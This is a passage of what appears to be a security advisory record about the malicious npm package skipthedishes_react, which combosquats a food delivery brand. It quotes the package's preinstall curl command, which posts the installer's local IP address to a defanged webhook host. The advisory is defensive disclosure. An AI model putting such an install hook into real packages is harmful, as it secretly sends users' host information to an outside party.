  "summary": "Malicious code in skipthedishes_react (npm)",
  "details": "The package skipthedishes_react@0.1.0 contains a preinstall script in package.json that, upon installation, runs `curl --data \"ip=$(hostname -I)\"` to POST the installer's local IP address to the remote endpoint hxxps://webhook-test[.]com/9e564ced26afdbbc9a94ade711456ddb. The package ships no code or functional content — only the malicious hook — and the package name combosquats the SkipTheDishes food delivery service.",
